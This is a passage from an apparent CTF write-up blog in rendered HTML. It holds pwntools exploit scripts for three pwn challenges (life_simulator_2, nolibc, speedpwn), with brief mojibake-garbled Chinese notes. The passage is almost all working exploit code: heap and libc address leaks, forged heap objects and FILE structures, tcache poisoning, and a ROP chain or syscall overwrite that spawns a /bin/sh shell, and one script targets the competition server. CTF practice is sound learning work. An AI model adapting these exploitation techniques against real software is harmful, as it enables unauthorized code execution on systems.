class="hljs-built_in">format</span>(company_name, company_budget))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sell_company</span>(<span class="hljs-params">company_name</span>):<br>    sl(<span class="hljs-string">&#x27;sell_company &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(company_name))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add_projct</span>(<span class="hljs-params">company_name, project_name, project_profit_per_week</span>):<br>    sl(<span class="hljs-string">&#x27;add_project &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([company_name, project_name, <span class="hljs-built_in">str</span>(project_profit_per_week)]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">remove_project</span>(<span class="hljs-params">company_name, project_name</span>):<br>    sl(<span class="hljs-string">&#x27;remove_project &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([company_name, project_name]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hire_worker</span>(<span class="hljs-params">company_name, project_name, worker_name, salary</span>):<br>    sl(<span class="hljs-string">&#x27;hire_worker &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([company_name, project_name, worker_name, <span class="hljs-built_in">str</span>(salary)]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fire_worker</span>(<span class="hljs-params">worker_name</span>):<br>    sl(<span class="hljs-string">&#x27;fire_worker &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([worker_name]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move_worker</span>(<span class="hljs-params">worker_name, new_project_name</span>):<br>    sl(<span class="hljs-string">&#x27;move_worker &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([worker_name, new_project_name]))<br>    ru(<span class="hljs-string">&#x27;INFO: Success&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">worker_info</span>(<span class="hljs-params">worker_name</span>):<br>    sl(<span class="hljs-string">&#x27;worker_info &#x27;</span> + <span class="hljs-string">&#x27; &#x27;</span>.join([worker_name]))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">elapse_week</span>():<br>    sl(<span class="hljs-string">&#x27;elapse_week&#x27;</span>)<br><br><span class="hljs-comment">#p = process(&#x27;./life_simulator_2&#x27;)</span><br>p=remote(<span class="hljs-string">&#x27;life-simulator-2.chals.sekai.team&#x27;</span>,<span class="hljs-number">1337</span>,ssl=<span class="hljs-literal">True</span>)<br><br>add_company(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;111&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>elapse_week()<br>elapse_week()<br>elapse_week()<br><br>sell_company(<span class="hljs-string">&#x27;test&#x27;</span>)<br><br>add_company(<span class="hljs-string">&#x27;pureland&#x27;</span>, <span class="hljs-number">10000</span>)<br>add_projct(<span class="hljs-string">&#x27;pureland&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>, <span class="hljs-number">1000000</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):<br>    hire_worker(<span class="hljs-string">&#x27;pureland&#x27;</span>, <span class="hljs-string">&#x27;666&#x27;</span>, <span class="hljs-string">&#x27;worker%d&#x27;</span>%i, <span class="hljs-number">100</span>)<br><br>elapse_week()<br>elapse_week()<br><br>sell_company(<span class="hljs-string">&#x27;pureland&#x27;</span>)<br><br><br>add_company(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;test1&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>add_projct(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-number">1000</span>)<br>worker_info(<span class="hljs-string">&#x27;worker0&#x27;</span>)<br><br>ru(<span class="hljs-string">&#x27;Project workers count: &#x27;</span>)<br>heapbase=<span class="hljs-built_in">int</span>(ru(<span class="hljs-string">&#x27;\n&#x27;</span>)) * <span class="hljs-number">8</span> - <span class="hljs-number">0x133e0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heapbase))<br><br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x500</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-number">1000</span>)<br>remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x500</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arr</span>(<span class="hljs-params">addr,fake_com</span>):<br>    add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">1000</span>)<br>    add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">1000</span>)<br>    sell_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>)<br>    remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>    remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>)<br><br>    pl = p64(addr) + p64(<span class="hljs-number">8</span>)<br>    pl = pl.ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pl += p64(fake_com)[:-<span class="hljs-number">1</span>]<br>    sl(<span class="hljs-string">b&#x27;hire_worker test c &#x27;</span>+pl+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br>    worker_info(<span class="hljs-string">&#x27;worker0&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;fire_worker &#x27;</span>+pl)<br><br>arr(heapbase+<span class="hljs-number">0x16280</span>,heapbase+<span class="hljs-number">0x13670</span>)<br><br>ru(<span class="hljs-string">&#x27;Project name: &#x27;</span>)<br>libcbase=u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))-<span class="hljs-number">0x204130</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libcbase))<br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;f&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>arr(libcbase+<span class="hljs-number">0x20ad58</span>,heapbase+<span class="hljs-number">0x1000</span>)<br><br>ru(<span class="hljs-string">&#x27;Project name: &#x27;</span>)<br>stack=u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack))<br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;g&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>, <span class="hljs-number">1000</span>)<br><br>p_fake_com=heapbase+<span class="hljs-number">0x15b50</span><br>p_fake_arr=p_fake_com+<span class="hljs-number">0x48</span><br>p_fake_pj=p_fake_arr+<span class="hljs-number">8</span><br>p_ob=heapbase+<span class="hljs-number">0x280</span><br>fake_com=p64(heapbase)+p64(<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">4</span><br>fake_com+=p64(p_fake_arr)+p64(p_fake_arr+<span class="hljs-number">8</span>)*<span class="hljs-number">2</span><br>fake_com_arr=p64(p_fake_pj)<br>fake_pj=p64(p_fake_pj+<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">7</span>)+<span class="hljs-string">b&#x27;fakeobj\x00&#x27;</span><br>fake_pj+=p64(<span class="hljs-number">100</span>)<br>fake_pj+=p64(p_ob)*<span class="hljs-number">2</span>+p64(p_ob+<span class="hljs-number">8</span>)<br>sl(<span class="hljs-string">b&#x27;hire_worker test c &#x27;</span>+fake_com+fake_com_arr+fake_pj+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br><br>hire_worker(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x450</span>, <span class="hljs-number">100</span>)<br>fire_worker(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x400</span>)<br><br><br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-number">1000</span>)<br>add_projct(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-number">1000</span>)<br>sell_company(<span class="hljs-string">&#x27;fake_com&#x27;</span>)<br>remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>)<br>remove_project(<span class="hljs-string">&#x27;test&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>)<br>pl = p64(libcbase) + p64(<span class="hljs-number">8</span>)<br>pl = pl.ljust(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>pl += p64(p_fake_com)[:-<span class="hljs-number">1</span>]<br>sl(<span class="hljs-string">b&#x27;hire_worker test c &#x27;</span>+pl+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br><br>move_worker(<span class="hljs-string">&#x27;worker0&#x27;</span>,<span class="hljs-string">&#x27;fakeobj&#x27;</span>)<br><br><span class="hljs-comment"># 0x13850</span><br><br>add_projct(<span class="hljs-string">&#x27;test1&#x27;</span>,<span class="hljs-string">&#x27;c&#x27;</span>,<span class="hljs-number">1000</span>)<br><br>pl=p64(heapbase)*(<span class="hljs-number">0x40</span>//<span class="hljs-number">8</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x160b0</span>)<br>pl+=p64(heapbase)*(<span class="hljs-number">0xd8</span>//<span class="hljs-number">8</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x13670</span>)+p64(heapbase+<span class="hljs-number">0x13670</span>)<br>pl+=p64(heapbase)*(<span class="hljs-number">0xf0</span>//<span class="hljs-number">8</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x13680</span>)+p64(<span class="hljs-number">5</span>)+<span class="hljs-string">b&#x27;test1\x00\x00\x00&#x27;</span><br>pl+=p64(heapbase+<span class="hljs-number">0x135a0</span>)+p64(<span class="hljs-number">0x3e8</span>)+p64(<span class="hljs-number">0</span>)<br>pl+=p64(heapbase+<span class="hljs-number">0x13490</span>)+p64(heapbase+<span class="hljs-number">0x13498</span>)*<span class="hljs-number">2</span><br>pl+=p64(heapbase)*(<span class="hljs-number">0x188</span>//<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0</span>)<br>pl+=p64(<span class="hljs-number">0x91</span>)<br>pl+=p64(((heapbase+<span class="hljs-number">0x13850</span>)&gt;&gt;<span class="hljs-number">12</span>)^(stack-<span class="hljs-number">0x4a0</span>-<span class="hljs-number">8</span>))[:-<span class="hljs-number">1</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(pl)))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>sl(<span class="hljs-string">b&#x27;hire_worker test1 c &#x27;</span>+pl+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>rdi=libcbase+<span class="hljs-number">0x10f75b</span><br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))+libcbase<br>ret=libcbase+<span class="hljs-number">0x2882f</span><br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>rop_chain=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)<br>rop_chain=rop_chain.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;a&#x27;</span>)<br>sl(<span class="hljs-string">b&#x27;hire_worker test1 c &#x27;</span>+rop_chain+<span class="hljs-string">b&#x27; 100&#x27;</span>)<br><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="nolibc"><a href="#nolibc" class="headerlink" title="nolibc"></a>nolibc</h1><p>top chunkæ²¡ç®—0x10çš„å¤´å¯¼è‡´0x10çš„æº¢å‡ºï¼Œæ”¹ç³»ç»Ÿè°ƒç”¨å·</p><h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">name,passwd</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Username: &#x27;</span>,name)<br>    p.sendafter(<span class="hljs-string">b&#x27;Password: &#x27;</span>,passwd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>(<span class="hljs-params">name,passwd</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Username: &#x27;</span>,name)<br>    p.sendafter(<span class="hljs-string">b&#x27;Password: &#x27;</span>,passwd)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exitt</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sz,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter string length: &#x27;</span>,<span class="hljs-built_in">str</span>(sz).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter a string: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Enter the index of the string to delete: &#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">filename</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the filename: &#x27;</span>,filename)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">filename</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choose an option: &#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    p.sendafter(<span class="hljs-string">b&#x27;Enter the filename: &#x27;</span>,filename)<br><br><br>p=process(<span class="hljs-string">&#x27;./main&#x27;</span>)<br>register(<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>,<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>,<span class="hljs-string">b&#x27;lcpa\n&#x27;</span>)<br>add(<span class="hljs-number">0x3f</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">7</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)       <span class="hljs-comment"># 1 0</span><br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0xf</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)  <span class="hljs-comment"># 1</span><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x17</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>) <span class="hljs-comment"># 1</span><br>view()<br>p.recvuntil(<span class="hljs-string">b&#x27;String 1: aaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)<br>pie=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x90f0</span><br>log.info(<span class="hljs-string">&#x27;PIE: &#x27;</span>+<span class="hljs-built_in">hex</span>(pie))<br><br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">0</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0xb4</span>):<br>    add(<span class="hljs-number">0x100</span>-<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>)<br><br>add(<span class="hljs-number">0x3f</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span>+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-number">1</span>)+p32(<span class="hljs-number">59</span>)+p32(<span class="hljs-number">3</span>))<br><br>delete(<span class="hljs-number">0</span>)<br>load(<span class="hljs-string">b&#x27;/bin/sh\n&#x27;</span>)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="speedpwn"><a href="#speedpwn" class="headerlink" title="speedpwn"></a>speedpwn</h1><p>scanfè¾“å…¥+è·³è¿‡è¾“å…¥ï¼Œsimulateåˆ©ç”¨æ ˆä¸Šæ®‹ç•™libcåœ°å€æ³„æ¼ï¼Œfightä¼ªé€ FILEç»“æ„ä½“æ‰“io</p><h2 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fight</span>(<span class="hljs-params">num</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;f&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Player plays: &#x27;</span>,<span class="hljs-built_in">str</span>(num).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">simulate</span>(<span class="hljs-params">play</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;s&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Bot number: &#x27;</span>,<span class="hljs-string">b&#x27;+&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Player number: &#x27;</span>,<span class="hljs-built_in">str</span>(play).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printg</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;p&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reseed</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>,<span class="hljs-string">b&#x27;r&#x27;</span>)<br><br><br>p=process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">guess</span>():<br>    num=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> cnt <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>        num=(<span class="hljs-number">1</span> &lt;&lt; cnt) - <span class="hljs-number">1</span><br>        simulate(num)<br>        p.recvuntil(<span class="hljs-string">b&#x27;Simulation result: &#x27;</span>)<br>        s=p.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;You win!\n&#x27;</span>==s:<br>            <span class="hljs-keyword">break</span><br>    log.info(<span class="hljs-string">&quot;cnt of 1: &quot;</span>+<span class="hljs-built_in">str</span>(cnt))<br>    ret=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>):<br>        <span class="hljs-keyword">if</span> num==<span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">break</span><br>        simulate(ret|(num&lt;&lt;i))<br>        p.recvuntil(<span class="hljs-string">b&#x27;Simulation result: &#x27;</span>)<br>        s=p.recvline()<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;Bot win!\n&#x27;</span>==s:<br>            ret|=<span class="hljs-number">1</span>&lt;&lt;(i-<span class="hljs-number">1</span>)<br>            num&gt;&gt;=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> ret<br><br>libcbase=guess()-<span class="hljs-number">0x955c2</span><br>log.info(<span class="hljs-string">&quot;libcbase: &quot;</span>+<span class="hljs-built_in">hex</span>(libcbase))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_byte</span>(<span class="hljs-params">num</span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        <span class="hljs-keyword">if</span> num&amp;<span class="hljs-number">1</span>==<span class="hljs-number">1</span>:<br>            fight((<span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">64</span>)-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">else</span>:<br>            fight(<span class="hljs-number">0</span>)<br>        num&gt;&gt;=<span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_pl</span>(<span class="hljs-params">pl</span>):<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> pl:<br>        write_byte(item)<br><br><span class="hljs-comment"># _IO_file_xsgetn</span><br><br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.39.so&#x27;</span>)<br><br>p_fake_io=<span class="hljs-number">0x4040a0</span><br>p_fake_wfile=p_fake_io+<span class="hljs-number">0x100</span><br>p_fake_wfile_vtable=p_fake_wfile+<span class="hljs-number">0x100</span><br>p_fake_chunk=p_fake_wfile_vtable+<span class="hljs-number">0x100</span><br>io_wfile_jmp=libcbase+<span class="hljs-number">0x202228</span><br>system=libcbase+libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>pl=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(p_fake_io)<br>fake_io=<span class="hljs-string">b&#x27;  sh&#x27;</span><br>fake_io=fake_io.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_io+=p64(p_fake_chunk)<br>fake_io=fake_io.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_io+=p64(p_fake_wfile)<br>fake_io=fake_io.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_io+=p64(io_wfile_jmp+<span class="hljs-number">0x18</span>-<span class="hljs-number">0x40</span>)<br>fake_wfile=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0</span>)<br>fake_wfile=fake_wfile.ljust(<span class="hljs-number">0x30</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wfile+=p64(<span class="hljs-number">0</span>)<br>fake_wfile=fake_wfile.ljust(<span class="hljs-number">0xe0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_wfile+=p64(p_fake_wfile_vtable)<br>fake_wfile_vtable=<span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x68</span>+p64(system)<br>fake_chunk=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">1</span>)<br><br>pl+=fake_io.ljust(<span class="hljs-number">0x100</span>,<span 